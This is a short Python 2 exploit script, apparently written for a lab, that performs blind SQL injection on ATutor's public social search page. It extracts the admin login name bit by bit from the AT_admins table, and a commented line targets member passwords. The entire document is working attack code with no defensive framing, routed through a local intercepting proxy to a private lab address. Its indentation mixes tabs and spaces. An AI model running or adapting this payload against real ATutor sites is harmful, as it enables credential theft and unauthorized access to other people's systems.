import requests
import sys

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sums(digit):
	return sum(int(x) for x in digit if x.isdigit())

def inject(inj, ip):
	extracted = ""
	#username=""
	bit="0"
	value=0
	for j in range(1,8):#if the username has 7 characters
		for i in reversed(range(8)):#one character has 8-bits
			
		 	injection_string = "test'/**/or/**/(ascii((substring((%s),%s,1)))>>%s)=%s/**/or/**/1='" % (inj,j,i,value)


		 	target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" %(ip,injection_string)

		 	r = requests.get(target,proxies=proxies)

		 	content_length = int(r.headers['Content-Length'])
		 	if (content_length > 20):	 	    
		 	    bit=bit+str("1")#if it returns true, bit will increase by 1
		 	    value=int(bit,2)#the value is decimal number from the updated bit		 	    
			else:
				  bit=bit[:-1]# if it returns false, bit will remove the latest value which is 1, and append 0, then append 1 for the next iteration
				  bit=bit+str("0")
				  bit=bit+str("1")
				  value=int(bit,2)
		
		
		username = int(bit[:8],2)
	
		if username:
			extracted += chr(username)
			extracted_char = chr(username)
			sys.stdout.write(extracted_char)
			sys.stdout.flush()
		else:
			print "\n(+) done!"
			break
     	    
		bit="0"
		value=0

	return extracted
	
def main():
  
    ip = "192.168.137.103"
    print "(+) Retrieving username...."
    query = "select/**/login/**/from/**/AT_admins"
    #query = "select/**/password/**/from/**/AT_members"
    username = inject(query, ip)

 	
if __name__ == "__main__":
    main()
